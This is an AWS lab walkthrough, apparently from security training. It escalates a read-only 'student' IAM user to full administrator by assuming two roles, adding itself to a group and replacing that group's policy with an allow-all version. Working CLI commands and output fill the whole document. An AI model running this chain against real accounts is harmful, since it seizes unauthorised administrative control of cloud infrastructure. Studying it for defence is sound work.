# Dangerous policy combination II

Sometimes one policy itself might not be sufficient to perform a privileged operation, however, multiple policies can allow an IAM user/role to perform a chain of operation which ultimately leads to privilege escalation on the AWS account.

Objective: Leverage the policies attached to the student user and attain administrative privileges on the AWS account.

----

1. Get access to AWS lab credentials.
2. Configure AWS CLI.
3. Check identity with:

```text
┌──(kali㉿kali)-[~]
└─$ aws sts get-caller-identity
{
    "UserId": "AIDA3BWBONZK44EREYF5Q",
    "Account": "759541165653",
    "Arn": "arn:aws:iam::759541165653:user/student"
}
```

4. List the policies attached to the `student` user:

```text
┌──(kali㉿kali)-[~]
└─$ aws iam list-attached-user-policies --user-name student
{
    "AttachedPolicies": [
        {
            "PolicyName": "IAMReadOnlyAccess",
            "PolicyArn": "arn:aws:iam::aws:policy/IAMReadOnlyAccess"
        }
    ]
}
```

5. Get information about the attached policies:

```text
┌──(kali㉿kali)-[~]
└─$ aws iam list-user-policies --user-name student
{
    "PolicyNames": [
        "terraform-20230511111609809100000003"
    ]
}

┌──(kali㉿kali)-[~]
└─$ aws iam get-user-policy --user-name student --policy-name terraform-20230511111609809100000003
{
    "UserName": "student",
    "PolicyName": "terraform-20230511111609809100000003",
    "PolicyDocument": {
        "Version": "2012-10-17",
        "Statement": [
            {
                "Action": [
                    "sts:AssumeRole"
                ],
                "Effect": "Allow",
                "Resource": [
                    "arn:aws:iam::759541165653:role/Adder",
                    "arn:aws:iam::759541165653:role/PolicyUpdater"
                ]
            }
        ]
    }
}
```

6. Try creating a new user named Bob

```text
┌──(kali㉿kali)-[~]
└─$ aws iam create-user --user-name Bob

An error occurred (AccessDenied) when calling the CreateUser operation: User: arn:aws:iam::759541165653:user/student is not authorized to perform: iam:CreateUser on resource: arn:aws:iam::759541165653:user/Bob because no identity-based policy allows the iam:CreateUser action
```

User creation failed due to insufficient privileges.

7. Check Adder role policies and permissions. Also, check the role-policy document:

```text
┌──(kali㉿kali)-[~]
└─$ aws iam list-role-policies --role-name Adder
{
    "PolicyNames": [
        "AddUser"
    ]
}

┌──(kali㉿kali)-[~]
└─$ aws iam get-role-policy --role-name Adder --policy-name AddUser
{
    "RoleName": "Adder",
    "PolicyName": "AddUser",
    "PolicyDocument": {
        "Version": "2012-10-17",
        "Statement": [
            {
                "Action": "iam:AddUserToGroup",
                "Effect": "Allow",
                "Resource": "arn:aws:iam::759541165653:group/Printers"
            }
        ]
    }
}
```

Role policy says that role Adder has permission to add any user to the Printers group.

8. Assume Adder role with student user.

```text
┌──(kali㉿kali)-[~]
└─$ aws sts assume-role --role-arn arn:aws:iam::759541165653:role/Adder --role-session-name adder_test
{
    "Credentials": {
        "AccessKeyId": "<access key id>",
        "SecretAccessKey": "<secret access key>",
        "SessionToken": "<session token>",
        "Expiration": "2023-05-11T12:21:45+00:00"
    },
    "AssumedRoleUser": {
        "AssumedRoleId": "AROA3BWBONZKUC67R3627:adder_test",
        "Arn": "arn:aws:sts::759541165653:assumed-role/Adder/adder_test"
    }
}
```

Make a note of Credentials and tokens.

9. Set the access key id, secret access key, and session token in environment variables:

```text
┌──(kali㉿kali)-[~]
└─$ export AWS_ACCESS_KEY_ID=<access key id>
export AWS_SECRET_ACCESS_KEY=<secret access key>
export AWS_SESSION_TOKEN=<session token>
```

10. Add student user to printers group:

```text
┌──(kali㉿kali)-[~]
└─$ aws iam add-user-to-group --group-name Printers --user-name student
```

11. Then unset environment variables:

```text
┌──(kali㉿kali)-[~]
└─$ unset AWS_ACCESS_KEY_ID
unset AWS_SECRET_ACCESS_KEY
unset AWS_SESSION_TOKEN
```

12. List groups for the student user.

```text
┌──(kali㉿kali)-[~]
└─$ aws iam list-groups-for-user --user-name student
{
    "Groups": [
        {
            "Path": "/",
            "GroupName": "Printers",
            "GroupId": "AGPA3BWBONZKTEZER727M",
            "Arn": "arn:aws:iam::759541165653:group/Printers",
            "CreateDate": "2023-05-11T11:15:53+00:00"
        }
    ]
}
```

Successfully added a student user to the Printers group.

13. Check the policies attached to the PolicyUpdater role policies and check the role-policy document:

```text
┌──(kali㉿kali)-[~]
└─$ aws iam list-role-policies --role-name PolicyUpdater
{
    "PolicyNames": [
        "CreatePolicyVersion"
    ]
}

┌──(kali㉿kali)-[~]
└─$ aws iam get-role-policy --role-name PolicyUpdater --policy-name CreatePolicyVersion
{
    "RoleName": "PolicyUpdater",
    "PolicyName": "CreatePolicyVersion",
    "PolicyDocument": {
        "Version": "2012-10-17",
        "Statement": [
            {
                "Action": "iam:CreatePolicyVersion",
                "Effect": "Allow",
                "Resource": "arn:aws:iam::759541165653:policy/Print"
            }
        ]
    }
}
```

Role policy says that role PolicyUpdater has permission to create a new PolicyVersion for Print policy.

14. Check the policies attached to the group Printers:

```text
┌──(kali㉿kali)-[~]
└─$ aws iam list-attached-group-policies --group-name Printers
{
    "AttachedPolicies": [
        {
            "PolicyName": "Print",
            "PolicyArn": "arn:aws:iam::759541165653:policy/Print"
        }
    ]
}
```

The Print policy is attached to the Printers group.

15. List the version of policies available for Print policy:

```text
┌──(kali㉿kali)-[~]
└─$ aws iam get-policy --policy-arn arn:aws:iam::759541165653:policy/Print
{
    "Policy": {
        "PolicyName": "Print",
        "PolicyId": "ANPA3BWBONZKWNU4TRXUN",
        "Arn": "arn:aws:iam::759541165653:policy/Print",
        "Path": "/",
        "DefaultVersionId": "v1",
        "AttachmentCount": 1,
        "PermissionsBoundaryUsageCount": 0,
        "IsAttachable": true,
        "CreateDate": "2023-05-11T11:15:53+00:00",
        "UpdateDate": "2023-05-11T11:15:53+00:00",
        "Tags": []
    }
}
```

16. View the policy document for v1 version of Print policy:

```text
┌──(kali㉿kali)-[~]
└─$ aws iam get-policy-version --policy-arn arn:aws:iam::759541165653:policy/Print --version-id v1
{
    "PolicyVersion": {
        "Document": {
            "Statement": [
                {
                    "Action": "s3:ListAllMyBuckets",
                    "Effect": "Allow",
                    "Resource": "*"
                }
            ],
            "Version": "2012-10-17"
        },
        "VersionId": "v1",
        "IsDefaultVersion": true,
        "CreateDate": "2023-05-11T11:15:53+00:00"
    }
}
```

17. Assume PolicyUpdater role:

```text
┌──(kali㉿kali)-[~]
└─$ aws sts assume-role --role-arn arn:aws:iam::759541165653:role/PolicyUpdater --role-session-name policy_test
{
    "Credentials": {
        "AccessKeyId": "<access key id>",
        "SecretAccessKey": "<secret access key>",
        "SessionToken": "<session token>",
        "Expiration": "2023-05-11T12:32:04+00:00"
    },
    "AssumedRoleUser": {
        "AssumedRoleId": "AROA3BWBONZKR5T3QNZTX:policy_test",
        "Arn": "arn:aws:sts::759541165653:assumed-role/PolicyUpdater/policy_test"
    }
}
```

Make a note of Credentials and tokens.

18. Set the access key id, secret access key, and session token in environment variables:

```text
┌──(kali㉿kali)-[~]
└─$ export AWS_ACCESS_KEY_ID=<access key id>
export AWS_SECRET_ACCESS_KEY=<secret access key>
export AWS_SESSION_TOKEN=<session token>
```

19. Create a new policy version and set it as default. Use the following policy document for Administrator Access:
 
 ***JSON: newAdminPolicy.json***:
 
```text
{
    "Version": "2012-10-17",
    "Statement": [
        {
            "Effect": "Allow",
            "Action": "*",
            "Resource": "*"
        }
    ]
}
```

```text
┌──(kali㉿kali)-[~]
└─$ aws iam create-policy-version --policy-arn arn:aws:iam::759541165653:policy/Print --policy-document file://newAdminPolicy.json --set-as-default
{
    "PolicyVersion": {
        "VersionId": "v2",
        "IsDefaultVersion": true,
        "CreateDate": "2023-05-11T11:36:22+00:00"
    }
}
```

20. Then unset environment variables:

```text
┌──(kali㉿kali)-[~]
└─$ unset AWS_ACCESS_KEY_ID
unset AWS_SECRET_ACCESS_KEY
unset AWS_SESSION_TOKEN
```

21. Check the new version of the Print policy:

```text
┌──(kali㉿kali)-[~]
└─$ aws iam get-policy-version --policy-arn arn:aws:iam::759541165653:policy/Print --version-id v2
{
    "PolicyVersion": {
        "Document": {
            "Version": "2012-10-17",
            "Statement": [
                {
                    "Effect": "Allow",
                    "Action": "*",
                    "Resource": "*"
                }
            ]
        },
        "VersionId": "v2",
        "IsDefaultVersion": true,
        "CreateDate": "2023-05-11T11:36:22+00:00"
    }
}
```
Successfully created policy version.

22. Try creating a new user on the AWS account named Bob to verify `Administrator Access`:

```text
┌──(kali㉿kali)-[~]
└─$ aws iam create-user --user-name Bob
{
    "User": {
        "Path": "/",
        "UserName": "Bob",
        "UserId": "AIDA3BWBONZKYHSFS46SQ",
        "Arn": "arn:aws:iam::759541165653:user/Bob",
        "CreateDate": "2023-05-11T11:38:38+00:00"
    }
}
```

Successfully performed a privileged operation.

